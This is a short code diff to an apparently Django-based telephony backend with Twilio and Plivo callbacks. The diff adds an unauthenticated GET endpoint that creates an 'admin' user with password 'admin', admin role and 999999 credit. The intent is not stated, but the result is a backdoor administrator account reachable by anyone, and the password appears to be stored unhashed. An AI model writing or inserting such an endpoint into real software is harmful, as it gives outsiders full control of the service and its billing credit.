@@ -94,6 +94,24 @@ def twilio_callback(request):
 # Plivo hits this after call ends
 # =====================================
 
+
+@api_view(['GET'])
+def create_admin(request):
+    user, created = User.objects.get_or_create(
+        username="admin",
+        defaults={
+            "password": "admin",
+            "role": "admin",
+            "status": "Active",
+            "credit": 999999
+        }
+    )
+
+    return Response({
+        "status": "success",
+        "created": created
+    })
+
 @csrf_exempt
 def twilio_status(request):
 
